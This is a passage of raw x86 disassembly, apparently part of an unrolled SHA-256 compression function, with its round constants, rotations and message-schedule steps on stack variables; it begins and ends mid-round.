mov edi [ ebp - 0x10 ]
xor edi [ ebp - 0xc ]
add ecx [ ebp - 0xac ]
and edi [ ebp - 0x18 ]
xor edi [ ebp - 0x10 ]
add edi ecx
mov ecx [ ebp + 0x8 ]
lea ecx [ edi + ecx - 0x391ff40d ]
add edx ecx
mov [ ebp + 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov ebx ecx
mov edi ecx
ror ebx 0xd
rol edi 0xa
xor ebx edi
mov edi ecx
ror edi 0x2
xor ebx edi
add ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
or edi ecx
and edi esi
mov [ ebp + 0x8 ] edi
mov edi [ ebp - 0x14 ]
and edi ecx
mov ecx [ ebp + 0x8 ]
or ecx edi
add ecx ebx
mov [ ebp + 0x8 ] ecx
mov edi [ ebp - 0xb0 ]
mov ecx [ ebp - 0xb0 ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0xb0 ]
shr ecx 0xa
xor edi ecx
add edi [ ebp - 0xc4 ]
mov ecx [ ebp - 0xe4 ]
mov ebx [ ebp - 0xe4 ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0xe4 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0xe8 ]
mov edi edx
mov [ ebp - 0xa8 ] ecx
mov ecx edx
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi edx
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0xa8 ]
mov edi [ ebp - 0xc ]
xor edi [ ebp - 0x18 ]
and edi edx
xor edi [ ebp - 0xc ]
add edi ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ edi + ecx - 0x2a586eb9 ]
mov edi [ ebp + 0x8 ]
add esi ecx
mov [ ebp + 0xc ] ecx
mov ebx edi
ror ebx 0xd
mov ecx edi
rol ecx 0xa
xor ebx ecx
mov ecx edi
ror ecx 0x2
xor ebx ecx
mov ecx [ ebp - 0x4 ]
add ebx [ ebp + 0xc ]
or ecx edi
and ecx [ ebp - 0x14 ]
mov edi [ ebp - 0x4 ]
and edi [ ebp + 0x8 ]
or ecx edi
mov edi [ ebp - 0xac ]
add ecx ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp - 0xac ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0xac ]
shr ecx 0xa
xor edi ecx
mov ecx [ ebp - 0xe0 ]
rol ecx 0xe
add edi [ ebp - 0xc0 ]
mov ebx [ ebp - 0xe0 ]
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0xe0 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0xe4 ]
mov edi esi
mov [ ebp - 0xa4 ] ecx
mov ecx esi
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi esi
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0xa4 ]
mov edi edx
xor edi [ ebp - 0x18 ]
and edi esi
xor edi [ ebp - 0x18 ]
add edi ecx
mov ecx [ ebp - 0xc ]
lea ecx [ edi + ecx + 0x6ca6351 ]
add [ ebp - 0x14 ] ecx
mov edi [ ebp - 0x10 ]
mov [ ebp + 0xc ] ecx
mov ebx edi
ror ebx 0xd
mov ecx edi
rol ecx 0xa
xor ebx ecx
mov ecx edi
ror ecx 0x2
xor ebx ecx
add ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
or ecx edi
and ecx [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
and edi [ ebp - 0x10 ]
or ecx edi
mov edi [ ebp - 0xa8 ]
add ecx ebx
mov ebx [ ebp - 0xdc ]
rol edi 0xf
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0xa8 ]
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0xa8 ]
shr ecx 0xa
xor edi ecx
mov ecx [ ebp - 0xdc ]
add edi [ ebp - 0xbc ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0xdc ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0xe0 ]
mov [ ebp - 0xa0 ] ecx
mov ecx [ ebp - 0x14 ]
mov edi ecx
ror edi 0xb
mov ebx ecx
rol ebx 0x7
xor edi ebx
mov ebx ecx
ror ebx 0x6
xor edi ebx
add edi [ ebp - 0xa0 ]
mov ebx edx
xor ebx esi
and ebx ecx
xor ebx edx
add ebx edi
mov edi [ ebp - 0xc ]
mov ecx [ ebp - 0x18 ]
lea ecx [ ebx + ecx + 0x14292967 ]
add [ ebp - 0x4 ] ecx
mov [ ebp + 0xc ] ecx
mov ebx edi
mov ecx edi
ror ebx 0xd
rol ecx 0xa
xor ebx ecx
mov ecx edi
ror ecx 0x2
xor ebx ecx
add ebx [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
or ecx edi
and ecx [ ebp + 0x8 ]
mov edi [ ebp - 0x10 ]
and edi [ ebp - 0xc ]
or ecx edi
add ecx ebx
mov edi [ ebp - 0xa4 ]
rol edi 0xf
mov ebx [ ebp - 0xd8 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0xa4 ]
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0xa4 ]
shr ecx 0xa
xor edi ecx
add edi [ ebp - 0xb8 ]
mov ecx [ ebp - 0xd8 ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0xd8 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0xdc ]
mov edi [ ebp - 0x4 ]
mov [ ebp - 0x9c ] ecx
mov ecx [ ebp - 0x4 ]
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi [ ebp - 0x4 ]
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0x9c ]
mov ebx [ ebp - 0xc ]
mov edi esi
xor edi [ ebp - 0x14 ]
and edi [ ebp - 0x4 ]
xor edi esi
add edi ecx
mov ecx [ ebp - 0x18 ]
lea edx [ edi + edx + 0x27b70a85 ]
add [ ebp + 0x8 ] edx
mov [ ebp + 0xc ] edx
mov edi ecx
ror edi 0xd
mov edx ecx
rol edx 0xa
xor edi edx
mov edx ecx
ror edx 0x2
xor edi edx
mov edx [ ebp - 0xc ]
add edi [ ebp + 0xc ]
or edx ecx
and edx [ ebp - 0x10 ]
and ebx ecx
or edx ebx
add edx edi
mov edi [ ebp - 0xa0 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xa0 ]
rol edi 0xf
rol edx 0xd
xor edi edx
mov edx [ ebp - 0xa0 ]
mov ebx [ ebp - 0xd4 ]
shr edx 0xa
xor edi edx
add edi [ ebp - 0xb4 ]
mov edx [ ebp - 0xd4 ]
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ ebp - 0xd4 ]
shr ebx 0x3
xor edx ebx
add edx edi
add edx [ ebp - 0xd8 ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x98 ] edx
mov edx [ ebp + 0x8 ]
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi [ ebp + 0x8 ]
ror edi 0x6
xor edx edi
add edx [ ebp - 0x98 ]
mov edi [ ebp - 0x14 ]
xor edi [ ebp - 0x4 ]
and edi [ ebp + 0x8 ]
xor edi [ ebp - 0x14 ]
add edi edx
lea esi [ edi + esi + 0x2e1b2138 ]
add [ ebp - 0x10 ] esi
mov edx [ ebp - 0x8 ]
mov [ ebp + 0xc ] esi
mov edi edx
ror edi 0xd
mov esi edx
rol esi 0xa
xor edi esi
mov esi edx
ror esi 0x2
xor edi esi
add edi [ ebp + 0xc ]
mov esi edx
or esi ecx
and esi [ ebp - 0xc ]
mov ebx edx
and ebx ecx
or esi ebx
add esi edi
mov edi [ ebp - 0x9c ]
mov ebx [ ebp - 0xd0 ]
mov [ ebp - 0x1c ] esi
mov esi [ ebp - 0x9c ]
rol edi 0xf
rol esi 0xd
xor edi esi
mov esi [ ebp - 0x9c ]
shr esi 0xa
xor edi esi
mov esi [ ebp - 0xd0 ]
add edi [ ebp - 0xb0 ]
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ ebp - 0xd0 ]
shr ebx 0x3
xor esi ebx
add esi edi
add esi [ ebp - 0xd4 ]
mov edi [ ebp - 0x10 ]
mov [ ebp - 0x94 ] esi
mov esi [ ebp - 0x10 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x10 ]
ror edi 0x6
xor esi edi
mov edi [ ebp - 0x4 ]
xor edi [ ebp + 0x8 ]
and edi [ ebp - 0x10 ]
add esi [ ebp - 0x94 ]
xor edi [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
add edi esi
mov esi [ ebp - 0x14 ]
lea esi [ edi + esi + 0x4d2c6dfc ]
add [ ebp - 0xc ] esi
mov [ ebp + 0xc ] esi
mov esi [ ebp - 0x1c ]
or [ ebp - 0x8 ] esi
and [ ebp - 0x8 ] ecx
mov edi esi
ror edi 0xd
mov ebx esi
rol ebx 0xa
xor edi ebx
mov ebx esi
ror ebx 0x2
xor edi ebx
add edi [ ebp + 0xc ]
mov ebx edx
and ebx esi
mov esi [ ebp - 0x8 ]
or esi ebx
add esi edi
mov edi [ ebp - 0xcc ]
rol edi 0xe
mov ebx [ ebp - 0x98 ]
mov [ ebp - 0x14 ] esi
mov esi [ ebp - 0xcc ]
ror esi 0x7
xor edi esi
mov esi [ ebp - 0xcc ]
shr esi 0x3
xor edi esi
add edi [ ebp - 0xac ]
mov esi [ ebp - 0x98 ]
rol esi 0xf
rol ebx 0xd
xor esi ebx
mov ebx [ ebp - 0x98 ]
shr ebx 0xa
xor esi ebx
add esi edi
add esi [ ebp - 0xd0 ]
mov edi [ ebp - 0xc ]
mov [ ebp - 0x90 ] esi
mov esi [ ebp - 0xc ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0xc ]
ror edi 0x6
xor esi edi
mov edi [ ebp + 0x8 ]
xor edi [ ebp - 0x10 ]
add esi [ ebp - 0x90 ]
and edi [ ebp - 0xc ]
xor edi [ ebp + 0x8 ]
add edi esi
mov esi [ ebp - 0x4 ]
lea esi [ edi + esi + 0x53380d13 ]
add ecx esi
mov [ ebp + 0xc ] esi
mov esi [ ebp - 0x14 ]
mov ebx esi
ror ebx 0xd
mov edi esi
rol edi 0xa
xor ebx edi
mov edi esi
ror edi 0x2
xor ebx edi
mov edi [ ebp - 0x1c ]
or edi esi
and edi edx
mov [ ebp - 0x8 ] edi
mov edi [ ebp - 0x1c ]
and edi esi
mov esi [ ebp - 0x8 ]
or esi edi
add ebx [ ebp + 0xc ]
mov edi [ ebp - 0xc8 ]
add esi ebx
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0xc8 ]
rol edi 0xe
ror esi 0x7
xor edi esi
mov esi [ ebp - 0xc8 ]
shr esi 0x3
xor edi esi
add edi [ ebp - 0xa8 ]
mov esi [ ebp - 0x94 ]
rol esi 0xf
mov ebx [ ebp - 0x94 ]
rol ebx 0xd
xor esi ebx
mov ebx [ ebp - 0x94 ]
shr ebx 0xa
xor esi ebx
add esi edi
add esi [ ebp - 0xcc ]
mov edi ecx
mov [ ebp - 0x8c ] esi
mov esi ecx
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi ecx
ror edi 0x6
xor esi edi
add esi [ ebp - 0x8c ]
mov edi [ ebp - 0x10 ]
xor edi [ ebp - 0xc ]
and edi ecx
xor edi [ ebp - 0x10 ]
add edi esi
mov esi [ ebp + 0x8 ]
lea esi [ edi + esi + 0x650a7354 ]
mov edi [ ebp - 0x4 ]
add edx esi
mov [ ebp + 0xc ] esi
mov ebx edi
ror ebx 0xd
mov esi edi
rol esi 0xa
xor ebx esi
mov esi edi
ror esi 0x2
xor ebx esi
add ebx [ ebp + 0xc ]
mov esi [ ebp - 0x14 ]
or esi edi
and esi [ ebp - 0x1c ]
mov edi [ ebp - 0x14 ]
and edi [ ebp - 0x4 ]
or esi edi
mov edi [ ebp - 0xc4 ]
add esi ebx
mov ebx [ ebp - 0x90 ]
mov [ ebp + 0x8 ] esi
mov esi [ ebp - 0xc4 ]
rol edi 0xe
ror esi 0x7
xor edi esi
mov esi [ ebp - 0xc4 ]
shr esi 0x3
xor edi esi
mov esi [ ebp - 0x90 ]
add edi [ ebp - 0xa4 ]
rol esi 0xf
rol ebx 0xd
xor esi ebx
mov ebx [ ebp - 0x90 ]
shr ebx 0xa
xor esi ebx
add esi edi
add esi [ ebp - 0xc8 ]
mov [ ebp - 0x88 ] esi
mov esi edx
ror esi 0xb
mov edi edx
rol edi 0x7
xor esi edi
mov edi edx
ror edi 0x6
xor esi edi
add esi [ ebp - 0x88 ]
mov edi [ ebp - 0xc ]
xor edi ecx
and edi edx
xor edi [ ebp - 0xc ]
add edi esi
mov esi [ ebp - 0x10 ]
lea esi [ edi + esi + 0x766a0abb ]
add [ ebp - 0x1c ] esi
mov edi [ ebp + 0x8 ]
mov [ ebp + 0xc ] esi
mov ebx edi
ror ebx 0xd
mov esi edi
rol esi 0xa
xor ebx esi
mov esi edi
ror esi 0x2
xor ebx esi
add ebx [ ebp + 0xc ]
mov esi [ ebp - 0x4 ]
or esi edi
and esi [ ebp - 0x14 ]
mov edi [ ebp - 0x4 ]
and edi [ ebp + 0x8 ]
or esi edi
add esi ebx
mov edi [ ebp - 0xc0 ]
mov ebx [ ebp - 0x8c ]
mov [ ebp - 0x10 ] esi
mov esi [ ebp - 0xc0 ]
rol edi 0xe
ror esi 0x7
xor edi esi
mov esi [ ebp - 0xc0 ]
shr esi 0x3
xor edi esi
add edi [ ebp - 0xa0 ]
mov esi [ ebp - 0x8c ]
rol esi 0xf
rol ebx 0xd
xor esi ebx
mov ebx [ ebp - 0x8c ]
shr ebx 0xa
xor esi ebx
add esi edi
add esi [ ebp - 0xc4 ]
mov [ ebp - 0x84 ] esi
mov esi [ ebp - 0x1c ]
mov edi esi
ror edi 0xb
mov ebx esi
rol ebx 0x7
xor edi ebx
mov ebx esi
ror ebx 0x6
xor edi ebx
add edi [ ebp - 0x84 ]
mov ebx edx
xor ebx ecx
and ebx esi
mov esi [ ebp - 0xc ]
xor ebx ecx
add ebx edi
mov edi [ ebp - 0x10 ]
lea esi [ ebx + esi - 0x7e3d36d2 ]
add [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] esi
mov ebx edi
ror ebx 0xd
mov esi edi
rol esi 0xa
xor ebx esi
mov esi edi
ror esi 0x2
xor ebx esi
add ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
or esi edi
and esi [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
and edi [ ebp - 0x10 ]
or esi edi
add esi ebx
mov edi [ ebp - 0xbc ]
rol edi 0xe
mov ebx [ ebp - 0x88 ]
mov [ ebp - 0xc ] esi
mov esi [ ebp - 0xbc ]
ror esi 0x7
xor edi esi
mov esi [ ebp - 0xbc ]
shr esi 0x3
xor edi esi
add edi [ ebp - 0x9c ]
mov esi [ ebp - 0x88 ]
rol esi 0xf
rol ebx 0xd
xor esi ebx
mov ebx [ ebp - 0x88 ]
shr ebx 0xa
xor esi ebx
add esi edi
add esi [ ebp - 0xc0 ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x80 ] esi
mov esi [ ebp - 0x14 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x14 ]
ror edi 0x6
xor esi edi
add esi [ ebp - 0x80 ]
mov ebx [ ebp - 0x10 ]
mov edi edx
xor edi [ ebp - 0x1c ]
and edi [ ebp - 0x14 ]
xor edi edx
add edi esi
mov esi [ ebp - 0xc ]
lea ecx [ edi + ecx - 0x6d8dd37b ]
add [ ebp - 0x4 ] ecx
mov [ ebp + 0xc ] ecx
mov edi esi
ror edi 0xd
mov ecx esi
rol ecx 0xa
xor edi ecx
mov ecx esi
ror ecx 0x2
xor edi ecx
add edi [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
or ecx esi
and ecx [ ebp + 0x8 ]
and ebx esi
or ecx ebx
mov ebx [ ebp - 0x84 ]
add ecx edi
mov edi [ ebp - 0xb8 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0xb8 ]
rol edi 0xe
ror ecx 0x7
xor edi ecx
mov ecx [ ebp - 0xb8 ]
shr ecx 0x3
xor edi ecx
mov ecx [ ebp - 0x84 ]
rol ecx 0xf
rol ebx 0xd
xor ecx ebx
mov ebx [ ebp - 0x84 ]
shr ebx 0xa
add edi [ ebp - 0x98 ]
xor ecx ebx
add ecx edi
add ecx [ ebp - 0xbc ]
mov edi [ ebp - 0x4 ]
mov [ ebp - 0x7c ] ecx
mov ecx [ ebp - 0x4 ]
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi [ ebp - 0x4 ]
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0x7c ]
mov edi [ ebp - 0x1c ]
xor edi [ ebp - 0x14 ]
mov ebx esi
and edi [ ebp - 0x4 ]
xor edi [ ebp - 0x1c ]
add edi ecx
lea edx [ edi + edx - 0x5d40175f ]
add [ ebp + 0x8 ] edx
mov ecx [ ebp - 0x18 ]
mov [ ebp + 0xc ] edx
mov edi ecx
ror edi 0xd
mov edx ecx
rol edx 0xa
xor edi edx
and ebx ecx
mov edx ecx
ror edx 0x2
xor edi edx
add edi [ ebp + 0xc ]
mov edx esi
or edx ecx
and edx [ ebp - 0x10 ]
or edx ebx
add edx edi
mov edi [ ebp - 0xb4 ]
mov ebx [ ebp - 0x80 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xb4 ]
rol edi 0xe
ror edx 0x7
xor edi edx
mov edx [ ebp - 0xb4 ]
shr edx 0x3
xor edi edx
add edi [ ebp - 0x94 ]
mov edx [ ebp - 0x80 ]
rol edx 0xf
rol ebx 0xd
xor edx ebx
mov ebx [ ebp - 0x80 ]
shr ebx 0xa
xor edx ebx
add edx edi
add edx [ ebp - 0xb8 ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x78 ] edx
mov edx [ ebp + 0x8 ]
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi [ ebp + 0x8 ]
ror edi 0x6
xor edx edi
mov edi [ ebp - 0x14 ]
xor edi [ ebp - 0x4 ]
add edx [ ebp - 0x78 ]
and edi [ ebp + 0x8 ]
xor edi [ ebp - 0x14 ]
add edi edx
mov edx [ ebp - 0x1c ]
lea edx [ edi + edx - 0x57e599b5 ]
mov edi [ ebp - 0x8 ]
add [ ebp - 0x10 ] edx
mov ebx edi
mov [ ebp + 0xc ] edx
ror ebx 0xd
mov edx edi
rol edx 0xa
xor ebx edx
mov edx edi
ror edx 0x2
xor ebx edx
add ebx [ ebp + 0xc ]
mov edx edi
or edx ecx
and edx esi
and edi ecx
or edx edi
add edx ebx
mov edi [ ebp - 0xb0 ]
rol edi 0xe
mov [ ebp - 0x1c ] edx
mov edx [ ebp - 0xb0 ]
ror edx 0x7
xor edi edx
mov edx [ ebp - 0xb0 ]
shr edx 0x3
xor edi edx
add edi [ ebp - 0x90 ]
mov edx [ ebp - 0x7c ]
mov ebx [ ebp - 0x7c ]
rol edx 0xf
rol ebx 0xd
xor edx ebx
mov ebx [ ebp - 0x7c ]
shr ebx 0xa
xor edx ebx
add edx edi
add edx [ ebp - 0xb4 ]
mov edi [ ebp - 0x10 ]
mov [ ebp - 0x74 ] edx
mov edx [ ebp - 0x10 ]
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi [ ebp - 0x10 ]
ror edi 0x6
xor edx edi
add edx [ ebp - 0x74 ]
mov edi [ ebp - 0x4 ]
xor edi [ ebp + 0x8 ]
and edi [ ebp - 0x10 ]
xor edi [ ebp - 0x4 ]
add edi edx
mov edx [ ebp - 0x14 ]
lea edx [ edi + edx - 0x3db47490 ]
add esi edx
mov [ ebp + 0xc ] edx
mov edx [ ebp - 0x1c ]
mov ebx edx
mov edi edx
ror ebx 0xd
rol edi 0xa
xor ebx edi
mov edi edx
ror edi 0x2
xor ebx edi
mov edi [ ebp - 0x8 ]
add ebx [ ebp + 0xc ]
or edi edx
and edi ecx
mov [ ebp - 0x18 ] edi
mov edi [ ebp - 0x8 ]
and edi edx
mov edx [ ebp - 0x18 ]
or edx edi
mov edi [ ebp - 0xac ]
add edx ebx
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0xac ]
rol edi 0xe
ror edx 0x7
xor edi edx
mov edx [ ebp - 0xac ]
shr edx 0x3
xor edi edx
mov edx [ ebp - 0x78 ]
add edi [ ebp - 0x8c ]
rol edx 0xf
mov ebx [ ebp - 0x78 ]
rol ebx 0xd
xor edx ebx
mov ebx [ ebp - 0x78 ]
shr ebx 0xa
xor edx ebx
add edx edi
add edx [ ebp - 0xb0 ]
mov edi esi
mov [ ebp - 0x70 ] edx
mov edx esi
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi esi
ror edi 0x6
xor edx edi
add edx [ ebp - 0x70 ]
mov edi [ ebp + 0x8 ]
xor edi [ ebp - 0x10 ]
and edi esi
xor edi [ ebp + 0x8 ]
add edi edx
mov edx [ ebp - 0x4 ]
lea edx [ edi + edx - 0x3893ae5d ]
mov edi [ ebp - 0x14 ]
add ecx edx
mov [ ebp + 0xc ] edx
mov ebx edi
mov edx edi
ror ebx 0xd
rol edx 0xa
xor ebx edx
mov edx edi
ror edx 0x2
xor ebx edx
add ebx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
or edx edi
and edx [ ebp - 0x8 ]
mov edi [ ebp - 0x1c ]
and edi [ ebp - 0x14 ]
or edx edi
mov edi [ ebp - 0xa8 ]
add edx ebx
mov ebx [ ebp - 0x74 ]
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0xa8 ]
rol edi 0xe
ror edx 0x7
xor edi edx
mov edx [ ebp - 0xa8 ]
shr edx 0x3
xor edi edx
add edi [ ebp - 0x88 ]
mov edx [ ebp - 0x74 ]
rol edx 0xf
rol ebx 0xd
xor edx ebx
mov ebx [ ebp - 0x74 ]
shr ebx 0xa
xor edx ebx
add edx edi
add edx [ ebp - 0xac ]
mov edi ecx
mov [ ebp - 0x6c ] edx
mov edx ecx
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi ecx
ror edi 0x6
xor edx edi
mov edi [ ebp - 0x10 ]
add edx [ ebp - 0x6c ]
xor edi esi
and edi ecx
xor edi [ ebp - 0x10 ]
add edi edx
mov edx [ ebp + 0x8 ]
lea edx [ edi + edx - 0x2e6d17e7 ]
add [ ebp - 0x8 ] edx
mov edi [ ebp - 0x4 ]
mov [ ebp + 0xc ] edx
mov ebx edi
ror ebx 0xd
mov edx edi
rol edx 0xa
xor ebx edx
mov edx edi
ror edx 0x2
xor ebx edx
add ebx [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
or edx edi
and edx [ ebp - 0x1c ]
mov edi [ ebp - 0x14 ]
and edi [ ebp - 0x4 ]
or edx edi
add edx ebx
mov edi [ ebp - 0xa4 ]
mov [ ebp + 0x8 ] edx
mov edx [ ebp - 0xa4 ]
mov ebx [ ebp - 0x70 ]
rol edi 0xe
ror edx 0x7
xor edi edx
mov edx [ ebp - 0xa4 ]
shr edx 0x3
xor edi edx
add edi [ ebp - 0x84 ]
mov edx [ ebp - 0x70 ]
rol edx 0xf
rol ebx 0xd
xor edx ebx
mov ebx [ ebp - 0x70 ]
shr ebx 0xa
xor edx ebx
add edx edi
add edx [ ebp - 0xa8 ]
mov [ ebp - 0x68 ] edx
mov edx [ ebp - 0x8 ]
mov edi edx
ror edi 0xb
mov ebx edx
rol ebx 0x7
xor edi ebx
mov ebx edx
ror ebx 0x6
xor edi ebx
add edi [ ebp - 0x68 ]
mov ebx esi
xor ebx ecx
and ebx edx
mov edx [ ebp - 0x10 ]
xor ebx esi
add ebx edi
mov edi [ ebp + 0x8 ]
lea edx [ ebx + edx - 0x2966f9dc ]
add [ ebp - 0x1c ] edx
mov [ ebp + 0xc ] edx
mov ebx edi
ror ebx 0xd
mov edx edi
rol edx 0xa
xor ebx edx
mov edx edi
ror edx 0x2
xor ebx edx
mov edx [ ebp - 0x4 ]
add ebx [ ebp + 0xc ]
or edx edi
and edx [ ebp - 0x14 ]
mov edi [ ebp - 0x4 ]
and edi [ ebp + 0x8 ]
or edx edi
mov edi [ ebp - 0xa0 ]
add edx ebx
mov [ ebp - 0x10 ] edx
rol edi 0xe
mov edx [ ebp - 0xa0 ]
ror edx 0x7
xor edi edx
mov edx [ ebp - 0xa0 ]
mov ebx [ ebp - 0x6c ]
shr edx 0x3
xor edi edx
add edi [ ebp - 0x80 ]
mov edx [ ebp - 0x6c ]
rol edx 0xf
rol ebx 0xd
xor edx ebx
mov ebx [ ebp - 0x6c ]
shr ebx 0xa
xor edx ebx
add edx edi
add edx [ ebp - 0xa4 ]
mov [ ebp - 0x64 ] edx
mov edx [ ebp - 0x1c ]
mov edi edx
ror edi 0xb
mov ebx edx
rol ebx 0x7
xor edi ebx
mov ebx edx
ror ebx 0x6
xor edi ebx
add edi [ ebp - 0x64 ]
mov ebx [ ebp - 0x8 ]
xor ebx ecx
and ebx edx
mov edx [ ebp - 0x10 ]
xor ebx ecx
add ebx edi
lea esi [ ebx + esi - 0xbf1ca7b ]
add [ ebp - 0x14 ] esi
mov [ ebp + 0xc ] esi
mov ebx [ ebp + 0x8 ]
mov edi edx
ror edi 0xd
mov esi edx
rol esi 0xa
xor edi esi
mov esi edx
ror esi 0x2
xor edi esi
add edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
or esi edx
and esi [ ebp - 0x4 ]
and ebx edx
or esi ebx
add esi edi
mov edi [ ebp - 0x9c ]
mov ebx [ ebp - 0x68 ]
mov [ ebp - 0xc ] esi
mov esi [ ebp - 0x9c ]
rol edi 0xe
ror esi 0x7
xor edi esi
mov esi [ ebp - 0x9c ]
shr esi 0x3
xor edi esi
mov esi [ ebp - 0x68 ]
add edi [ ebp - 0x7c ]
rol esi 0xf
rol ebx 0xd
xor esi ebx
mov ebx [ ebp - 0x68 ]
shr ebx 0xa
xor esi ebx
add esi edi
add esi [ ebp - 0xa0 ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x60 ] esi
mov esi [ ebp - 0x14 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x14 ]
ror edi 0x6
xor esi edi
add esi [ ebp - 0x60 ]
mov edi [ ebp - 0x8 ]
xor edi [ ebp - 0x1c ]
mov ebx edx
and edi [ ebp - 0x14 ]
xor edi [ ebp - 0x8 ]
add edi esi
lea ecx [ edi + ecx + 0x106aa070 ]
add [ ebp - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov [ ebp + 0xc ] ecx
and ebx esi
mov edi esi
ror edi 0xd
mov ecx esi
rol ecx 0xa
xor edi ecx
mov ecx esi
ror ecx 0x2
xor edi ecx
add edi [ ebp + 0xc ]
mov ecx edx
or ecx esi
and ecx [ ebp + 0x8 ]
or ecx ebx
add ecx edi
mov edi [ ebp - 0x64 ]
rol edi 0xf
mov ebx [ ebp - 0x98 ]
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x64 ]
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0x64 ]
shr ecx 0xa
xor edi ecx
add edi [ ebp - 0x78 ]
mov ecx [ ebp - 0x98 ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0x98 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0x9c ]
mov edi [ ebp - 0x4 ]
mov [ ebp - 0x5c ] ecx
mov ecx [ ebp - 0x4 ]
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi [ ebp - 0x4 ]
ror edi 0x6
xor ecx edi
mov edi [ ebp - 0x1c ]
xor edi [ ebp - 0x14 ]
add ecx [ ebp - 0x5c ]
and edi [ ebp - 0x4 ]
xor edi [ ebp - 0x1c ]
add edi ecx
mov ecx [ ebp - 0x8 ]
lea ecx [ edi + ecx + 0x19a4c116 ]
add [ ebp + 0x8 ] ecx
mov [ ebp + 0xc ] ecx
mov ecx [ ebp - 0x18 ]
mov edi ecx
ror edi 0xd
mov ebx ecx
rol ebx 0xa
xor edi ebx
mov ebx ecx
ror ebx 0x2
mov [ ebp - 0x8 ] esi
or [ ebp - 0x8 ] ecx
and [ ebp - 0x8 ] edx
xor edi ebx
mov ebx esi
and ebx ecx
mov ecx [ ebp - 0x8 ]
add edi [ ebp + 0xc ]
or ecx ebx
add ecx edi
mov [ ebp - 0x8 ] ecx
mov edi [ ebp - 0x60 ]
mov ecx [ ebp - 0x60 ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0x60 ]
shr ecx 0xa
xor edi ecx
add edi [ ebp - 0x74 ]
mov ecx [ ebp - 0x94 ]
rol ecx 0xe
mov ebx [ ebp - 0x94 ]
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0x94 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0x98 ]
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x58 ] ecx
mov ecx [ ebp + 0x8 ]
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi [ ebp + 0x8 ]
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0x58 ]
mov edi [ ebp - 0x14 ]
xor edi [ ebp - 0x4 ]
and edi [ ebp + 0x8 ]
xor edi [ ebp - 0x14 ]
add edi ecx
mov ecx [ ebp - 0x1c ]
lea ecx [ edi + ecx + 0x1e376c08 ]
add edx ecx
mov [ ebp + 0xc ] ecx
mov ecx [ ebp - 0x8 ]
mov edi ecx
mov ebx ecx
ror edi 0xd
rol ebx 0xa
xor edi ebx
